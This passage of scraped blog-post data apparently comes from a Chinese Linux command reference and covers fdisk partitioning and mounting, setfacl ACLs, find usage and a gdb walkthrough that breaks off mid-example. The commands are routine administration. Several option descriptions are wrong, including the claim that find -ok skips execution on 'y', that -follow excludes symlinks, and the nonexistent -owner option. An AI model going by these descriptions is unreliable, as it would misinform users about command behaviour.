1-4，也就是说最多有 4 个主分区或者扩展分区，逻辑分区开始的磁盘号为 5，因此在这个实验中试没有 sdb4 的。 最后对分区操作进行保存： Command (m for help): w The partition table has been altered! Calling ioctl() to re-read partition table. Syncing disks. 建立好分区之后我们还需要对分区进行格式化才能在系统中使用磁盘。 在 sdb1 上建立 ext2 分区： [root@localhost ~]# mkfs.ext2 /dev/sdb1 mke2fs 1.39 (29-May-2006) Filesystem label= OS type: Linux Block size=4096 (log=2) Fragment size=4096 (log=2) 100576 inodes, 200804 blocks 10040 blocks (5.00%) reserved for the super user First data block=0 Maximum filesystem blocks=209715200 7 block groups 32768 blocks per group, 32768 fragments per group 14368 inodes per group Superblock backups stored on blocks: 32768, 98304, 163840 Writing inode tables: done Writing superblocks and filesystem accounting information: done This filesystem will be automatically checked every 32 mounts or 180 days, whichever comes first. Use tune2fs -c or -i to override. 在 sdb6 上建立 ext3 分区： [root@localhost ~]# mkfs.ext3 /dev/sdb6 mke2fs 1.39 (29-May-2006) Filesystem label= OS type: Linux Block size=4096 (log=2) Fragment size=4096 (log=2) 217280 inodes, 433747 blocks 21687 blocks (5.00%) reserved for the super user First data block=0 Maximum filesystem blocks=444596224 14 block groups 32768 blocks per group, 32768 fragments per group 15520 inodes per group Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912 Writing inode tables: done Creating journal (8192 blocks): done Writing superblocks and filesystem accounting information: done This filesystem will be automatically checked every 32 mounts or 180 days, whichever comes first. Use tune2fs -c or -i to override. [root@localhost ~]# 建立两个目录/oracle和/web，将新建好的两个分区挂载到系统： [root@localhost ~]# mkdir /oracle [root@localhost ~]# mkdir /web [root@localhost ~]# mount /dev/sdb1 /oracle [root@localhost ~]# mount /dev/sdb6 /web 查看分区挂载情况： [root@localhost ~]# df -h 文件系统 容量 已用 可用 已用% 挂载点 /dev/mapper/VolGroup00-LogVol00 6.7G 2.8G 3.6G 44% / /dev/sda1 99M 12M 82M 13% /boot tmpfs 125M 0 125M 0% /dev/shm /dev/sdb1 773M 808K 733M 1% /oracle /dev/sdb6 1.7G 35M 1.6G 3% /web 如果需要每次开机自动挂载则需要修改/etc/fstab文件，加入两行配置： [root@localhost ~]# vim /etc/fstab /dev/VolGroup00/LogVol00 / ext3 defaults 1 1 LABEL=/boot /boot ext3 defaults 1 2 tmpfs /dev/shm tmpfs defaults 0 0 devpts /dev/pts devpts gid=5,mode=620 0 0 sysfs /sys sysfs defaults 0 0 proc /proc proc defaults 0 0 /dev/VolGroup00/LogVol01 swap swap defaults 0 0 /dev/sdb1 /oracle ext2 defaults 0 0 /dev/sdb6 /web ext3 defaults 0 0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"fdisk","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/fdisk/","stats":{"text":"9 min read","time":502000,"words":1614,"minutes":9},"date":"2022-02-02 15:38:26","dateFormat":"2022-02-02"},{"content":"设置文件访问控制列表。 补充说明 setfacl 命令是用来在命令行里设置 ACL（访问控制列表）。在命令行里，一系列的命令跟随以一系列的文件名。 选项 -b,--remove-all：删除所有扩展的acl规则，基本的acl规则(所有者，群组，其他）将被保留。 -k,--remove-default：删除缺省的acl规则。如果没有缺省规则，将不提示。 -n，--no-mask：不要重新计算有效权限。setfacl默认会重新计算ACL mask，除非mask被明确的制定。 --mask：重新计算有效权限，即使ACL mask被明确指定。 -d，--default：设定默认的acl规则。 --restore=file：从文件恢复备份的acl规则（这些文件可由getfacl -R产生）。通过这种机制可以恢复整个目录树的acl规则。此参数不能和除--test以外的任何参数一同执行。 --test：测试模式，不会改变任何文件的acl规则，操作后的acl规格将被列出。 -R，--recursive：递归的对所有文件及目录进行操作。 -L，--logical：跟踪符号链接，默认情况下只跟踪符号链接文件，跳过符号链接目录。 -P，--physical：跳过所有符号链接，包括符号链接文件。 --version：输出setfacl的版本号并退出。 --help：输出帮助信息。 --：标识命令行参数结束，其后的所有参数都将被认为是文件名 -：如果文件名是-，则setfacl将从标准输入读取文件名。 选项-m和-x后边跟以 acl 规则。多条 acl 规则以逗号 (,) 隔开。选项-M和-X用来从文件或标准输入读取 acl 规则。 选项--set和--set-file用来设置文件或目录的 acl 规则，先前的设定将被覆盖。 选项-m(--modify)和-M(--modify-file)选项修改文件或目录的 acl 规则。 选项-x(--remove)和-X(--remove-file)选项删除 acl 规则。 当使用-M，-X 选项从文件中读取规则时，setfacl 接受 getfacl 命令输出的格式。每行至少一条规则，以#开始的行将被视为注释。 当在不支持 ACLs 的文件系统上使用 setfacl 命令时，setfacl 将修改文件权限位。如果 acl 规则并不完全匹配文件权限位，setfacl 将会修改文件权限位使其尽可能的反应 acl 规则，并会向 standard error 发送错误消息，以大于 0 的状态返回。 权限 文件的所有者以及有CAP_FOWNER的用户进程可以设置一个文件的 acl。（在目前的 linux 系统上，root 用户是唯一有CAP_FOWNER能力的用户） ACL 规则 setfacl 命令可以识别以下的规则格式： [d[efault]:] [u[ser]:]uid [:perms] 指定用户的权限，文件所有者的权限（如果uid没有指定） [d[efault]:] g[roup]:gid [:perms] 指定群组的权限，文件所有群组的权限（如果gid未指定） [d[efault]:] m[ask][:] [:perms] 有效权限掩码 [d[efault]:] o[ther] [:perms] 其他的权限 恰当的 acl 规则被用在修改和设定的操作中，对于 uid 和 gid，可以指定一个数字，也可指定一个名字。perms 域是一个代表各种权限的字母的组合：读-r写-w执行-x，执行只适合目录和一些可执行的文件。pers 域也可设置为八进制格式。 自动创建的规则 最初的，文件目录仅包含 3 个基本的 acl 规则。为了使规则能正常执行，需要满足以下规则。 3 个基本规则不能被删除。 任何一条包含指定的用户名或群组名的规则必须包含有效的权限组合。 任何一条包含缺省规则的规则在使用时，缺省规则必须存在。 ACL 的名词定义 先来看看在 ACL 里面每一个名词的定义，这些名词我大多从 man page 上摘下来虽然有些枯燥,但是对于理解下面的内容还是很有帮助的。 ACL 是由一系列的 Access Entry 所组成的，每一条 Access Entry 定义了特定的类别可以对文件拥有的操作权限。Access Entry 有三个组成部分：Entry tag type, qualifier (optional), permission。 我们先来看一下最重要的 Entry tag type，它有以下几个类型： ACL_USER_OBJ：相当于Linux里file_owner的permission ACL_USER：定义了额外的用户可以对此文件拥有的permission ACL_GROUP_OBJ：相当于Linux里group的permission ACL_GROUP：定义了额外的组可以对此文件拥有的permission ACL_MASK：定义了ACL_USER, ACL_GROUP_OBJ和ACL_GROUP的最大权限 (这个我下面还会专门讨论) ACL_OTHER：相当于Linux里other的permission 让我们来据个例子说明一下，下面我们就用 getfacl 命令来查看一个定义好了的 ACL 文件： [root@localhost ~]# getfacl ./test.txt # file: test.txt # owner: root # group: admin user::rw- user:john:rw- group::rw- group:dev:r-- mask::rw- other::r-- 前面三个以#开头的定义了文件名，file owner 和 group。这些信息没有太大的作用，接下来我们可以用--omit-header来省略掉。 user::rw- 定义了ACL_USER_OBJ, 说明file owner拥有read and write permission user:john:rw- 定义了ACL_USER,这样用户john就拥有了对文件的读写权限,实现了我们一开始要达到的目的 group::rw- 定义了ACL_GROUP_OBJ,说明文件的group拥有read and write permission group:dev:r-- 定义了ACL_GROUP,使得dev组拥有了对文件的read permission mask::rw- 定义了ACL_MASK的权限为read and write other::r-- 定义了ACL_OTHER的权限为read 从这里我们就可以看出 ACL 提供了我们可以定义特定用户和用户组的功能，那么接下来我们就来看一下如何设置一个文件的 ACL： 如何设置 ACL 文件 首先我们还是要讲一下设置 ACL 文件的格式，从上面的例子中我们可以看到每一个 Access Entry 都是由三个被：号分隔开的字段所组成，第一个就是 Entry tag type。 user 对应了ACL_USER_OBJ和ACL_USER group 对应了ACL_GROUP_OBJ和ACL_GROUP mask 对应了ACL_MASK other 对应了ACL_OTHER 第二个字段称之为 qualifier，也就是上面例子中的 john 和 dev 组，它定义了特定用户和拥护组对于文件的权限。这里我们也可以发现只有 user 和 group 才有 qualifier，其他的都为空。第三个字段就是我们熟悉的 permission 了。它和 Linux 的 permission 一样定义，这里就不多讲了。 下面我们就来看一下怎么设置 test.txt 这个文件的 ACL 让它来达到我们上面的要求。 一开始文件没有 ACL 的额外属性： [root@localhost ~]# ls -l -rw-rw-r-- 1 root admin 0 Jul 3 22:06 test.txt [root@localhost ~]# getfacl --omit-header ./test.txt user::rw- group::rw- other::r-- 我们先让用户 john 拥有对 test.txt 文件的读写权限： [root@localhost ~]# setfacl -m user:john:rw- ./test.txt [root@localhost ~]# getfacl --omit-header ./test.txt user::rw- user:john:rw- group::rw- mask::rw- other::r-- 这时我们就可以看到 john 用户在 ACL 里面已经拥有了对文件的读写权。这个时候如果我们查看一下 linux 的 permission 我们还会发现一个不一样的地方。 [root@localhost ~]# ls -l ./test.txt -rw-rw-r--+ 1 root admin 0 Jul 3 22:06 ./test.txt 在文件 permission 的最后多了一个+号，当任何一个文件拥有了 ACL_USER 或者 ACL_GROUP 的值以后我们就可以称它为 ACL 文件，这个+号就是用来提示我们的。我们还可以发现当一个文件拥有了ACL_USER或者ACL_GROUP的值时ACL_MASK同时也会被定义。 接下来我们来设置 dev 组拥有 read permission： [root@localhost ~]# setfacl -m group:dev:r-- ./test.txt [root@localhost ~]# getfacl --omit-header ./test.txt user::rw- user:john:rw- group::rw- group:dev:r-- mask::rw- other::r-- 到这里就完成了我们上面讲到的要求，是不是很简单呢。 ACL_MASK 和 Effective permission 这里需要重点讲一下ACL_MASK，因为这是掌握 ACL 的另一个关键，在 Linux file permission 里面大家都知道比如对于rw-rw-r--来说, 当中的那个rw-是指文件组的 permission. 但是在 ACL 里面这种情况只是在ACL_MASK不存在的情况下成立。如果文件有 ACL_MASK 值，那么当中那个rw-代表的就是 mask 值而不再是 group permission 了。 让我们来看下面这个例子： [root@localhost ~]# ls -l -rwxrw-r-- 1 root admin 0 Jul 3 23:10 test.sh 这里说明 test.sh 文件只有 file owner: root 拥有 read, write, execute/search permission。admin 组只有 read and write permission，现在我们想让用户 john 也对 test.sh 具有和 root 一样的 permission。 [root@localhost ~]# setfacl -m user:john:rwx ./test.sh [root@localhost ~]# getfacl --omit-header ./test.sh user::rwx user:john:rwx group::rw- mask::rwx other::r-- 这里我们看到 john 已经拥有了 rwx 的 permission，mask 值也被设定为 rwx，那是因为它规定了ACL_USER，ACL_GROUP和ACL_GROUP_OBJ的最大值，现在我们再来看 test.sh 的 Linux permission，它已经变成了： [root@localhost ~]# ls -l -rwxrwxr--+ 1 root admin 0 Jul 3 23:10 test.sh 那么如果现在 admin 组的用户想要执行 test.sh 的程序会发生什么情况呢？它会被 permission deny。原因在于实际上 admin 组的用户只有 read and write permission，这里当中显示的 rwx 是ACL_MASK的值而不是 group 的 permission。 所以从这里我们就可以知道，如果一个文件后面有+标记，我们都需要用 getfacl 来确认它的 permission，以免发生混淆。 下面我们再来继续看一个例子，假如现在我们设置 test.sh 的 mask 为 read only，那么 admin 组的用户还会有 write permission 吗？ [root@localhost ~]# setfacl -m mask::r-- ./test.sh [root@localhost ~]# getfacl --omit-header ./test.sh user::rwx user:john:rwx #effective:r-- group::rw- #effective:r-- mask::r-- other::r-- 这时候我们可以看到 ACL_USER 和 ACL_GROUP_OBJ 旁边多了个#effective:r--，这是什么意思呢？让我们再来回顾一下ACL_MASK的定义。它规定了ACL_USER，ACL_GROUP_OBJ和ACL_GROUP的最大权限。那么在我们这个例子中他们的最大权限也就是 read only。虽然我们这里给ACL_USER和ACL_GROUP_OBJ设置了其他权限，但是他们真正有效果的只有 read 权限。 这时我们再来查看 test.sh 的 Linux file permission 时它的 group permission 也会显示其 mask 的值 (i.e. r--) [root@localhost ~]# ls -l -rwxr--r--+ 1 root admin 0 Jul 3 23:10 test.sh Default ACL 上面我们所有讲的都是 Access ACL，也就是对文件而言。下面我简单讲一下 Default ACL。Default ACL 是指对于一个目录进行 Default ACL 设置，并且在此目录下建立的文件都将继承此目录的 ACL。 同样我们来做一个试验说明，比如现在 root 用户建立了一个 dir 目录： [root@localhost ~]# mkdir dir 他希望所有在此目录下建立的文件都可以被 john 用户所访问，那么我们就应该对 dir 目录设置 Default ACL。 [root@localhost ~]# setfacl -d -m user:john:rw ./dir [root@localhost ~]# getfacl --omit-header ./dir user::rwx group::rwx other::r-x default:user::rwx default:user:john:rwx default:group::rwx default:mask::rwx default: other::r-x 这里我们可以看到 ACL 定义了 default 选项，john 用户拥有了 default 的 read, write, excute/search permission。所有没有定义的 default 都将从 file permission 里 copy 过来，现在 root 用户在 dir 下建立一个 test.txt 文件。 [root@localhost ~]# touch ./dir/test.txt [root@localhost ~]# ls -l ./dir/test.txt -rw-rw-r--+ 1 root root 0 Jul 3 23:46 ./dir/test.txt [root@localhost ~]# getfacl --omit-header ./dir/test.txt user::rw- user:john:rw- group::rwx #effective:rw- mask::rw- other::r-- 这里我们看到在 dir 下建立的文件 john 用户自动就有了 read and write permission， ACL 相关命令 前面的例子中我们都注意到了 getfacl 命令是用来读取文件的 ACL，setfacl 是用来设定文件的 Acess ACL。这里还有一个 chacl 是用来改变文件和目录的 Access ACL and Default ACL，它的具体参数大家可以去看 man page。我只想提及一下chacl -B。它可以彻底删除文件或者目录的 ACL 属性 (包括 Default ACL)，比如你即使用了setfacl -x删除了所有文件的 ACL 属性，那个+号还是会出现在文件的末尾，所以正确的删除方法应该是用chacl -B用 cp 来复制文件的时候我们现在可以加上-p选项。这样在拷贝文件的时候也将拷贝文件的 ACL 属性，对于不能拷贝的 ACL 属性将给出警告。 mv 命令将会默认地移动文件的 ACL 属性，同样如果操作不允许的情况下会给出警告。 需要注意的几点 如果你的文件系统不支持 ACL 的话，你也许需要重新 mount 你的 file system： mount -o remount, acl [mount point] 如果用 chmod 命令改变 Linux file permission 的时候相应的 ACL 值也会改变，反之改变 ACL 的值，相应的 file permission 也会改变。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"setfacl","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/setfacl/","stats":{"text":"13 min read","time":777000,"words":3231,"minutes":13},"date":"2022-02-02 15:34:36","dateFormat":"2022-02-02"},{"content":"在指定目录下查找文件。 补充说明 find 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。 语法 find (选项) (参数) 选项 -amin&lt;分钟&gt;：查找在指定时间曾被存取过的文件或目录，单位以分钟计算； -anewer&lt;参考文件或目录&gt;：查找其存取时间较指定文件或目录的存取时间更接近现在的文件或目录； -atime&lt;24 小时数&gt;：查找在指定时间曾被存取过的文件或目录，单位以 24 小时计算； -cmin&lt;分钟&gt;：查找在指定时间之时被更改过的文件或目录； -cnewer&lt;参考文件或目录&gt;查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录； -ctime&lt;24 小时数&gt;：查找在指定时间之时被更改的文件或目录，单位以 24 小时计算； -daystart：从本日开始计算时间； -depth：从指定目录下最深层的子目录开始查找； -expty：寻找文件大小为 0 Byte 的文件，或目录下没有任何子目录或文件的空目录； -exec&lt;执行指令&gt;：假设 find 指令的回传值为 True，就执行该指令； -false：将 find 指令的回传值皆设为 False； -fls&lt;列表文件&gt;：此参数的效果和指定“-ls”参数类似，但会把结果保存为指定的列表文件； -follow：排除符号连接； -fprint&lt;列表文件&gt;：此参数的效果和指定“-print”参数类似，但会把结果保存成指定的列表文件； -fprint0&lt;列表文件&gt;：此参数的效果和指定“-print0”参数类似，但会把结果保存成指定的列表文件； -fprintf&lt;列表文件&gt;&lt;输出格式&gt;：此参数的效果和指定“-printf”参数类似，但会把结果保存成指定的列表文件； -fstype&lt;文件系统类型&gt;：只寻找该文件系统类型下的文件或目录； -gid&lt;群组识别码&gt;：查找符合指定之群组识别码的文件或目录； -group&lt;群组名称&gt;：查找符合指定之群组名称的文件或目录； -help 或--help：在线帮助； -ilname&lt;范本样式&gt;：此参数的效果和指定“-lname”参数类似，但忽略字符大小写的差别； -iname&lt;范本样式&gt;：此参数的效果和指定“-name”参数类似，但忽略字符大小写的差别； -inum&lt;inode 编号&gt;：查找符合指定的 inode 编号的文件或目录； -ipath&lt;范本样式&gt;：此参数的效果和指定“-path”参数类似，但忽略字符大小写的差别； -iregex&lt;范本样式&gt;：此参数的效果和指定“-regexe”参数类似，但忽略字符大小写的差别； -links&lt;连接数目&gt;：查找符合指定的硬连接数目的文件或目录； -lname&lt;范本样式&gt;：指定字符串作为寻找符号连接的范本样式； -ls：假设 find 指令的回传值为 Ture，就将文件或目录名称列出到标准输出； -maxdepth&lt;目录层级&gt;：设置最大目录层级； -mindepth&lt;目录层级&gt;：设置最小目录层级； -mmin&lt;分钟&gt;：查找在指定时间曾被更改过的文件或目录，单位以分钟计算； -mount：此参数的效果和指定“-xdev”相同； -mtime&lt;24 小时数&gt;：查找在指定时间曾被更改过的文件或目录，单位以 24 小时计算； -name&lt;范本样式&gt;：指定字符串作为寻找文件或目录的范本样式； -newer&lt;参考文件或目录&gt;：查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录； -nogroup：找出不属于本地主机群组识别码的文件或目录； -noleaf：不去考虑目录至少需拥有两个硬连接存在； -nouser：找出不属于本地主机用户识别码的文件或目录； -ok&lt;执行指令&gt;：此参数的效果和指定“-exec”类似，但在执行指令之前会先询问用户，若回答“y”或“Y”，则放弃执行命令； -path&lt;范本样式&gt;：指定字符串作为寻找目录的范本样式； -perm&lt;权限数值&gt;：查找符合指定的权限数值的文件或目录； -print：假设 find 指令的回传值为 Ture，就将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有“./”字符串； -print0：假设 find 指令的回传值为 Ture，就将文件或目录名称列出到标准输出。格式为全部的名称皆在同一行； -printf&lt;输出格式&gt;：假设 find 指令的回传值为 Ture，就将文件或目录名称列出到标准输出。格式可以自行指定； -prune：不寻找字符串作为寻找文件或目录的范本样式;-regex&lt;范本样式&gt;：指定字符串作为寻找文件或目录的范本样式； -size&lt;文件大小&gt;：查找符合指定的文件大小的文件； -true：将 find 指令的回传值皆设为 True； -type&lt;文件类型&gt;：只寻找符合指定的文件类型的文件； -uid&lt;用户识别码&gt;：查找符合指定的用户识别码的文件或目录； -used&lt;日数&gt;：查找文件或目录被更改之后在指定时间曾被存取过的文件或目录，单位以日计算； -user&lt;拥有者名称&gt;：查找符和指定的拥有者名称的文件或目录； -version 或——version：显示版本信息； -xdev：将范围局限在先行的文件系统中； -xtype&lt;文件类型&gt;：此参数的效果和指定“-type”参数类似，差别在于它针对符号连接检查。 参数 起始目录：查找文件的起始目录。 实例 # 当前目录搜索所有文件，文件内容 包含 “140.206.111.111” 的内容 find . -type f -name &quot;*&quot; | xargs grep &quot;140.206.111.111&quot; 根据文件或者正则表达式进行匹配 列出当前目录及子目录下所有文件和文件夹 find . 在/home目录下查找以.txt 结尾的文件名 find /home -name &quot;*.txt&quot; 同上，但忽略大小写 find /home -iname &quot;*.txt&quot; 当前目录及子目录下查找所有以.txt 和.pdf 结尾的文件 find . \\( -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; \\) 或 find . -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; 匹配文件路径或者文件 find /usr/ -path &quot;*local*&quot; 基于正则表达式匹配文件路径 find . -regex &quot;.*\\(\\.txt\\|\\.pdf\\)$&quot; 同上，但忽略大小写 find . -iregex &quot;.*\\(\\.txt\\|\\.pdf\\)$&quot; 否定参数 找出/home 下不是以.txt 结尾的文件 find /home ! -name &quot;*.txt&quot; 根据文件类型进行搜索 find . -type 类型参数 类型参数列表： f 普通文件 l 符号连接 d 目录 c 字符设备 b 块设备 s 套接字 p Fifo 基于目录深度搜索 向下最大深度限制为 3 find . -maxdepth 3 -type f 搜索出深度距离当前目录至少 2 个子目录的所有文件 find . -mindepth 2 -type f 根据文件时间戳进行搜索 find . -type f 时间戳 UNIX/Linux 文件系统每个文件都有三种时间戳： 访问时间 （-atime/天，-amin/分钟）：用户最近一次访问时间。 修改时间 （-mtime/天，-mmin/分钟）：文件最后一次修改时间。 变化时间 （-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。 搜索最近七天内被访问过的所有文件 find . -type f -atime -7 搜索恰好在七天前被访问过的所有文件 find . -type f -atime 7 搜索超过七天内被访问过的所有文件 find . -type f -atime +7 搜索访问时间超过 10 分钟的所有文件 find . -type f -amin +10 找出比 file.log 修改时间更长的所有文件 find . -type f -newer file.log 根据文件大小进行匹配 find . -type f -size 文件大小单元 文件大小单元： b —— 块（512 字节） c —— 字节 w —— 字（2 字节） k —— 千字节 M —— 兆字节 G —— 吉字节 搜索大于 10KB 的文件 find . -type f -size +10k 搜索小于 10KB 的文件 find . -type f -size -10k 搜索等于 10KB 的文件 find . -type f -size 10k 删除匹配文件 删除当前目录下所有.txt 文件 find . -type f -name &quot;*.txt&quot; -delete 根据文件权限/所有权进行匹配 当前目录下搜索出权限为 777 的文件 find . -type f -perm 777 找出当前目录下权限不是 644 的 php 文件 find . -type f -name &quot;*.php&quot; ! -perm 644 找出当前目录用户 tom 拥有的所有文件 find . -type f -user tom 找出当前目录用户组 sunk 拥有的所有文件 find . -type f -group sunk 借助-exec选项与其他命令结合使用 找出当前目录下所有 root 的文件，并把所有权更改为用户 tom find .-type f -user root -exec chown tom {} \\; 上例中， {} 用于与 -exec 选项结合使用来匹配所有文件，然后会被替换为相应的文件名。 找出自己家目录下所有的.txt 文件并删除 find $HOME/. -name &quot;*.txt&quot; -ok rm {} \\; 上例中， -ok 和 -exec 行为一样，不过它会给出提示，是否执行相应的操作。 查找当前目录下所有.txt 文件并把他们拼接起来写入到 all.txt 文件中 find . -type f -name &quot;*.txt&quot; -exec cat {} \\;&gt; /all.txt 将 30 天前的.log 文件移动到 old 目录中 find . -type f -mtime +30 -name &quot;*.log&quot; -exec cp {} old \\; 找出当前目录下所有.txt 文件并以“File:文件名”的形式打印出来 find . -type f -name &quot;*.txt&quot; -exec printf &quot;File: %s&lt;span title=&quot;\\n&quot;&gt;\\n&quot; {} \\; 因为单行命令中-exec 参数中无法使用多个命令，以下方法可以实现在-exec 之后接受多条命令 -exec ./text.sh {} \\; 搜索但跳出指定的目录 查找当前目录或者子目录下所有.txt 文件，但是跳过子目录 sk find . -path &quot;./sk&quot; -prune -o -name &quot;*.txt&quot; -print find 其他技巧收集 要列出所有长度为零的文件 find . -empty 其它实例 find ~ -name '*jpg' # 主目录中找到所有的 jpg 文件。 -name 参数允许你将结果限制为与给定模式匹配的文件。 find ~ -iname '*jpg' # -iname 就像 -name，但是不区分大小写 find ~ ( -iname 'jpeg' -o -iname 'jpg' ) # 一些图片可能是 .jpeg 扩展名。幸运的是，我们可以将模式用“或”（表示为 -o）来组合。 find ~ \\( -iname '*jpeg' -o -iname '*jpg' \\) -type f # 如果你有一些以 jpg 结尾的目录呢？ （为什么你要命名一个 bucketofjpg 而不是 pictures 的目录就超出了本文的范围。）我们使用 -type 参数修改我们的命令来查找文件。 find ~ \\( -iname '*jpeg' -o -iname '*jpg' \\) -type d # 也许你想找到那些命名奇怪的目录，以便稍后重命名它们 最近拍了很多照片，所以让我们把它缩小到上周更改的文件 find ~ \\( -iname '*jpeg' -o -iname '*jpg' \\) -type f -mtime -7 你可以根据文件状态更改时间 （ctime）、修改时间 （mtime） 或访问时间 （atime） 来执行时间过滤。 这些是在几天内，所以如果你想要更细粒度的控制，你可以表示为在几分钟内（分别是 cmin、mmin 和 amin）。 除非你确切地知道你想要的时间，否则你可能会在 + （大于）或 - （小于）的后面加上数字。 但也许你不关心你的照片。也许你的磁盘空间不够用，所以你想在 log 目录下找到所有巨大的（让我们定义为“大于 1GB”）文件： find /var/log -size +1G 或者，也许你想在 /data 中找到 bcotton 拥有的所有文件： find /data -owner bcotton 你还可以根据权限查找文件。也许你想在你的主目录中找到对所有人可读的文件，以确保你不会过度分享。 find ~ -perm -o=r 删除 mac 下自动生成的文件 find ./ -name '__MACOSX' -depth -exec rm -rf {} \\; 统计代码行数 find . -name &quot;*.java&quot;|xargs cat|grep -v ^$|wc -l # 代码行数统计, 排除空行 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"find","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/find/","stats":{"text":"13 min read","time":741000,"words":3206,"minutes":13},"date":"2022-02-02 15:31:33","dateFormat":"2022-02-02"},{"content":"功能强大的程序调试器。 补充说明 gdb 命令包含在 GNU 的 gcc 开发套件中，是功能强大的程序调试器。GDB 中的命令固然很多，但我们只需掌握其中十个左右的命令，就大致可以完成日常的基本的程序调试工作。 语法 gdb (选项) (参数) 选项 -cd：设置工作目录； -q：安静模式，不打印介绍信息和版本信息； -d：添加文件查找路径； -x：从指定文件中执行GDB指令； -s：设置读取的符号表文件。 命令 解释 示例 file &lt;文件名&gt; 加载被调试的可执行程序文件。 因为一般都在被调试程序所在目录下执行GDB，因而文本名不需要带路径。 (gdb) file gdb-sample r Run的简写，运行被调试的程序。 如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。 (gdb) r c Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。 (gdb) c b &lt;行号&gt; b &lt;函数名称&gt; b *&lt;函数名称&gt; b *&lt;代码地址&gt; d [编号] b: Breakpoint的简写，设置断点。两可以使用“行号”“函数名称”“执行地址”等方式指定断点位置。 其中在函数名称前面加“*”符号表示将断点设置在“由编译器生成的prolog代码处”。如果不了解汇编，可以不予理会此用法。 d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。 (gdb) b 8(gdb) b main (gdb) b *main (gdb) b *0x804835c (gdb) d s, n s: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数； n: 执行一行源程序代码，此行代码中的函数调用也一并执行。 s 相当于其它调试器中的“Step Into (单步跟踪进入)”； n 相当于其它调试器中的“Step Over (单步跟踪)”。 这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。 (gdb) s (gdb) n si, ni si命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。 (gdb) si (gdb) ni p &lt;变量名称&gt; Print的简写，显示指定变量（临时变量或全局变量）的值。 (gdb) p i (gdb) p nGlobalVar display ... undisplay &lt;编号&gt; display，设置程序中断后欲显示的数据及其格式。 例如，如果希望每次程序中断后可以看到即将被执行的下一条汇编指令，可以使用命令 “display /i $pc” 其中 $pc 代表当前汇编指令，/i 表示以十六进行显示。当需要关心汇编代码时，此命令相当有用。 undispaly，取消先前的display设置，编号从1开始递增。 (gdb) display /i $pc (gdb) undisplay 1 i info的简写，用于显示各类信息，详情请查阅“help i”。 (gdb) i r q Quit的简写，退出GDB调试环境。 (gdb) q help [命令名称] GDB帮助命令，提供对GDB名种命令的解释说明。 如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。 (gdb) help 参数 文件：二进制可执行程序。 实例 以下是 linux 下 dgb 调试的一个实例，先给出一个示例用的小程序，C语言代码： #include &lt;stdio.h&gt; int nGlobalVar = 0; int tempFunction(int a, int b) { printf(&quot;tempFunction is called, a = %d, b = %d /n&quot;, a, b); return (a + b); } int main() { int n; n = 1; n++; n--; nGlobalVar += 100; nGlobalVar -= 12; printf(&quot;n = %d, nGlobalVar = %d /n&quot;, n, nGlobalVar); n = tempFunction(1, 2); printf(&quot;n = %d&quot;, n); return 0; } 请将此代码复制出来并保存到文件 gdb-sample.c 中，然后切换到此文件所在目录，用 GCC 编译之： gcc gdb-sample.c -o gdb-sample -g 在上面的命令行中，使用 -o 参数指定了编译生成的可执行文件名为 gdb-sample，使用参数 -g 表示将源代码信息编译到可执行文件中。如果不使用参数 -g，会给后面的 GDB 调试造成不便。当然，如果我们没有程序的源代码，自然也无从使用 -g 参数，调试/跟踪时也只能是汇编代码级别的调试/跟踪。 下面“gdb”命令启动 GDB，将首先显示 GDB 说明，不管它： GNU gdb Red Hat Linux (5.3post-0.20021129.18rh) Copyright 2003 free Software Foundation, Inc. GDB is free software, covered by the GNU General Public License, and you are welcome to change it and/or distribute copies of it under certain conditions. type &quot;show copying&quot; to see the conditions. There is absolutely no warranty for GDB. Type &quot;show warranty&quot; for details. This GDB was configured as &quot;i386-redhat-linux-gnu&quot;. (gdb) 上面最后一行“(gdb)”为 GDB 内部命令引导符，等待用户输入 GDB 命令。 下面使用“file”命令载入被调试程序 gdb-sample（这里的 gdb-sample 即前面 GCC 编译输出的可执行文件）： (gdb) file gdb-sample Reading symbols from gdb-sample...done. 上面最后一行提示已经加载成功。 下面使用“r”命令执行（Run）被调试文件，因为尚未设置任何断点，将直接执行到程序结束： (gdb) r Starting program: /home/liigo/temp/test_jmp/test_jmp/gdb-sample n = 1, nGlobalVar = 88 tempFunction is called, a = 1, b = 2 n = 3 Program exited normally. 下面使用“b”命令在 main 函数开头设置一个断点（Breakpoint）： (gdb) b main Breakpoint 1 at 0x804835c: file gdb-sample.c, line 19. 上面最后一行提示已经成功设置断点，并给出了该断点信息：在源文件 gdb-sample.c 第19行处设置断点；这是本程序的第一个断点（序号为1）；断点处的代码地址为 0x804835c（此值可能仅在本次调试过程中有效）。回过头去看源代码，第19行中的代码为“n = 1”，恰好是 main 函数中的第一个可执行语句（前面的“int n;”为变量定义语句，并非可执行语句）。 再次使用“r”命令执行（Run）被调试程序： (gdb) r Starting program: /home/liigo/temp/gdb-sample Breakpoint 1, main () at gdb-sample.c:19 19 n = 1; 程序中断在 gdb-sample.c 第 19 行处，即 main 